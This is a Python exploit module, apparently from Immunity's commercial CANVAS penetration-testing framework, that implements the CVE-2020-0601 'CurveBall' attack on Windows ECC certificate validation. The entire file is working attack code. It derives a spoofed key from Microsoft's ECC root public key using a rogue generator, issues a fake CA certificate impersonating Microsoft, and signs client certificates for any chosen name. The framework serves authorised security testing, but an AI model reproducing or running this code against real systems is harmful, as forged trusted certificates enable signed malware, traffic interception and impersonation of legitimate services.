#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

# Canvas dependencies
import os
import sys
import logging
from ExploitTypes.localcommand import LocalCommand

# Module dependencies
from binascii import unhexlify, hexlify
from Crypto.Util.asn1 import DerSequence, DerOctetString
from OpenSSL import crypto
from libs import PEMHelper

NAME                            = "curveball"
DESCRIPTION                     = "Generate a CA signed certificate, with an spoofed CA. Based on CVE 2020-0601"
VERSION                         = "0.1"

DOCUMENTATION                   = {}
DOCUMENTATION["Commandline"]    = "runmodule curveball"

DOCUMENTATION["CVE Name"]       = "CVE-2020-0601"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0601"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION["Notes"]          = """
This module makes use of a vulnerability on the way that Windows verifies Elliptic Curve Criptography CA certificates.
Unpatched Windows OS does not verify that the curve used is using the default parameters, allowing an attacker to generate a custom CA public certificate that validates against the stored private one.

Three files will be written to the output file:
    spoofed_ca.crt  => Certificate created with custom generator to match the base certificate
    cert.crt        => Signed client certificate
    cert.key        => Signed client certificate key
"""

ec_key_template = '''-----BEGIN EC PRIVATE KEY-----
MIIB+gIBAQQwHCfsO/mgMZI9hbtevyjHeNLmmYD7UyDSUvhta/yesMeVZzLJGd6Y
6OS2rNTVn3GAoIIBWzCCAVcCAQEwPAYHKoZIzj0BAQIxAP//////////////////
///////////////////////+/////wAAAAAAAAAA/////zB7BDD/////////////
/////////////////////////////v////8AAAAAAAAAAP////wEMLMxL6fiPufk
mI4Fa+P4LRkYHZxu/oFBEgMUCI9QE4daxlY5jYou0Z0qhcjt0+wq7wMVAKM1kmqj
GaJ6HQCJamdzpIJ6zaxzBGEEqofKIr6LBTeOscce8yCtdG4dO2KLp5uYWfdB4IJU
KjhVAvJdv1UpbDpUXjhydgq3NhfeSpYmLG9dnpi/kpLcKfj0Hb0omhR86doxE7Xw
uMAKYLHOHX6BnXpDHXyQ6g5fAjEA////////////////////////////////x2NN
gfQ3Ld9YGg2ySLCneuzsGWrMxSlzAgEBoWQDYgAEibWeJFOAC5S504gARQZpXmsR
LMNUCRHGoPlfaEfZkJILD/4hInCvcG3qlWBerqxygLiT/d4ksA8tzR4qH/cKiO9V
wbLIpHWE1KWijGrVFrBAz/2iajc749Y/167uxPn7
-----END EC PRIVATE KEY-----'''

certificate_path = os.path.join(os.path.dirname(__file__), "Resources/MicrosoftECCProductRootCertificateAuthority.cer")

def get_der(file_str):
    keyfile = PEMHelper.PEMDecode(file_str)
    seq_der = DerSequence()
    seq_der.decode(keyfile[0])
    return seq_der._seq

def get_public_key(path):
    with open(path) as ca_file:
        ca_str = ca_file.read()

    ca_crt = crypto.load_certificate(crypto.FILETYPE_PEM, ca_str)
    str_ca_pub = get_crt_pubkey(ca_crt)
    return hexlify(get_der(str_ca_pub)[1][4:])

# This does some curve magic
def generate_spoofed_key(pubkey):
    x = int(pubkey[0:96], 16)
    y = int(pubkey[96:], 16)
    # Generate rogue generator
    # Generate degenerate case rogue generator
    privkey = '\x01'
    rogueG = unhexlify(b"04" + hex2(x).encode() + hex2(y).encode())

    # Generate the file with explicit parameters
    der = get_der(ec_key_template)

    # Replace private key
    octet_der = DerOctetString(privkey)
    der[1] = octet_der.encode()

    # Replace public key
    der[3] = b"\xa1\x64\x03b\x00" + unhexlify(b"04" + pubkey)

    # Replace the generator
    seq_der = DerSequence()
    seq_der.decode(der[2][4:])
    s =  seq_der._seq
    octet_der = DerOctetString(rogueG)
    s[3] = octet_der.encode()

    seq_der = DerSequence(s)
    der[2] = der[2][:4] + seq_der.encode()

    seq_der = DerSequence(der)
    return PEMHelper.PEMEncode(seq_der.encode(), 'EC PRIVATE KEY')

def generate_ca_cert(ca_key):
    cert = crypto.X509()
    cert.get_subject().C = "US"
    cert.get_subject().ST = "Washington"
    cert.get_subject().L = "Redmond"
    cert.get_subject().O = "MicrosoftCorporation"
    cert.get_subject().CN = "Microsft ECC Product Root Certificate Authority 2018"

    cert.set_serial_number(601799936201462160747772771394769378702429899549)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10*365*24*60*60)
    cert.set_issuer(cert.get_subject())

    cert.set_pubkey(ca_key)
    cert.sign(ca_key, 'sha256')

    return cert

def create_signed_cert(ca_key, ca_cert, cert_key, cn):
    cert_req = crypto.X509Req()
    cert_req.get_subject().C = "US"
    cert_req.get_subject().ST = "Washington"
    cert_req.get_subject().L = "Redmond"
    cert_req.get_subject().O ="MicrosoftCorporation"
    cert_req.get_subject().CN = cn

    cert_req.set_pubkey(cert_key)
    cert_req.sign(ca_key, 'sha256')

    cert = crypto.X509()
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(5 * 365 * 24 * 60 * 60)
    cert.set_issuer(ca_cert.get_subject())
    cert.set_subject(cert_req.get_subject())
    cert.set_pubkey(cert_req.get_pubkey())
    cert.sign(ca_key, 'sha256')

    return cert

def select_path(b, gtk, dialog, action, widget):
    dialog = gtk.FileChooserDialog('Select filename...', dialog, action,
        (gtk.STOCK_CANCEL, gtk.RESPONSE_CANCEL, gtk.STOCK_OPEN, gtk.RESPONSE_OK))
    try:
        dialog.set_filename(widget.get_text())

        if dialog.run() == gtk.RESPONSE_OK:
            fname = dialog.get_filename()
            widget.set_text(fname)
    finally:
        dialog.destroy()

def dialog_update(gtk, wtree):
    dialog = wtree.get_widget('exploit_dialog')

    widget = wtree.get_widget('certificate')
    widget.set_text(certificate_path)
    button = wtree.get_widget('certificate_btn')
    sig_cert = button.connect('clicked', select_path, gtk, dialog,
        gtk.FILE_CHOOSER_ACTION_OPEN, widget)

    widget = wtree.get_widget('output_folder')
    button = wtree.get_widget('output_folder_btn')
    sig_cert = button.connect('clicked', select_path, gtk, dialog,
        gtk.FILE_CHOOSER_ACTION_SELECT_FOLDER, widget)

    def disconnect(w):
        w.disconnect(sig)

def hex2(n):
    x = '%x' % (n)
    return ('0' * (len(x) % 2)) + x

def get_crt_pubkey(crtObj):
    pubKeyObject = crtObj.get_pubkey()
    pubKeyString = crypto.dump_publickey(crypto.FILETYPE_PEM, pubKeyObject)
    return pubKeyString.decode("utf-8")


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result = ""
        self.certificate_path = certificate_path
        self.common_name = ""
        self.output_folder = ""
        return

    def getargs(self):
        self.certificate_path     = self.argsDict.get("certificate", self.certificate_path)
        self.common_name     = self.argsDict.get("CN", self.common_name)
        self.output_folder = self.argsDict.get("output_folder", self.output_folder)

    def run(self):
        self.getargs()
        self.setProgress(0)
        self.setInfo("%s: (in progress) Creating CA spoofed key" % (NAME))

        try:
            pubkey = get_public_key(self.certificate_path)
        except:
            logging.critical("Failed to parse specificied CA Certificate")
            self.setProgress(-1)
            return False

        str_ca_key = generate_spoofed_key(pubkey)
        self.setProgress(25)
        self.setInfo("%s: (in progress) Create CA certificate" % (NAME))
        ca_key = crypto.load_privatekey(crypto.FILETYPE_PEM, str_ca_key)
        ca_cert = generate_ca_cert(ca_key)
        self.setProgress(50)
        self.setInfo("%s: (in progress) Creating signed client certificate" % (NAME))
        cert_key = crypto.PKey()
        cert_key.generate_key(crypto.TYPE_RSA, 2048)
        cert = create_signed_cert(ca_key,ca_cert,cert_key,self.common_name)
        self.setProgress(75)

        self.setInfo("%s: (in progress) Generating output files" % (NAME))
        try:
            with open('%s/spoofed_ca.crt' % self.output_folder,'wt') as f:
                f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, ca_cert).decode('utf-8'))

            with open('%s/cert.key' % self.output_folder,'wt') as f:
                f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, cert_key).decode('utf-8'))

            with open('%s/cert.crt' % self.output_folder,'wt') as f:
                f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode('utf-8'))
        except:
            logging.critical("Failed to write output files to the output directory")
            self.setProgress(-1)
            return False

        logging.warning('spoofed_ca.crt, cert.key, cert.crt have been created successfully in {}'.format(self.output_folder))
        self.setProgress(100)
        self.setInfo("%s: Succesful creation of certificate files at %s" % (NAME, self.output_folder))
        return True
